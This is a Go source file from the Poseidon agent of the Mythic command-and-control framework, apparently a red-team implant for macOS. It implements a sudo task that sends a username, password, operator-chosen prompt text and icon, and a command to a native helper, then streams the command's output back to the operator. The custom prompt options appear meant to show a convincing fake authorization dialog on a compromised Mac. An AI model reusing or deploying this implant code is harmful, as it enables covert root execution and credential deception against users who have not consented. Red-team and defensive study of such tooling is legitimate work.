//go:build darwin

package sudo

/*
#cgo LDFLAGS: -framework Security -framework Foundation
#cgo CFLAGS: -x objective-c
#include "sudo_darwin.h"
*/
import "C"
import (
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"io"
	"os"
	"unsafe"
)

func sudoWithPromptOption(task structs.Task, args Arguments) {
	msg := task.NewResponse()

	cUsername := C.CString(args.Username)
	defer C.free(unsafe.Pointer(cUsername))
	cPassword := C.CString(args.Password)
	defer C.free(unsafe.Pointer(cPassword))
	cPromptText := C.CString(args.PromptText)
	defer C.free(unsafe.Pointer(cPromptText))
	cPromptIconPath := C.CString(args.PromptIconPath)
	defer C.free(unsafe.Pointer(cPromptIconPath))
	cCommand := C.CString(args.Command)
	defer C.free(unsafe.Pointer(cCommand))
	cArgs := make([]*C.char, len(args.Args)+1)
	for i := range cArgs {
		cArgs[i] = nil
	}
	//cArgs[0] = C.CString(args.Command)
	for i, arg := range args.Args {
		cArgs[i] = C.CString(arg)
	}
	cArgv := (**C.char)(unsafe.Pointer(&cArgs[0]))
	for i := range cArgs {
		if cArgs[i] != nil {
			defer C.free(unsafe.Pointer(cArgs[i]))
		}
	}
	cFD := C.int(0)
	contents := C.sudo_poseidon(cUsername, cPassword, cPromptText, cPromptIconPath, cCommand, cArgv, &cFD)
	fd := int(cFD)
	if fd > 0 {
		newFD := os.NewFile(uintptr(cFD), "pipe")
		if newFD == nil {
			msg.SetError("Failed to get file descriptor for output of command")
			task.Job.SendResponses <- msg
			return
		}
		defer newFD.Close()
		data := make([]byte, 1024)
		for {
			n, err := newFD.Read(data)
			if err != nil {
				if err == io.EOF {
					msg.Completed = true
					msg.UserOutput = ""
					msg.Status = "completed"
					task.Job.SendResponses <- msg
					return
				}
				msg.SetError(err.Error())
				task.Job.SendResponses <- msg
				return
			}
			if n > 0 {
				msg.UserOutput = string(data[0:n])
				task.Job.SendResponses <- msg
				n = 0
			}
		}

	} else {
		msg.SetError(C.GoString(contents))
		task.Job.SendResponses <- msg
		return
	}

}
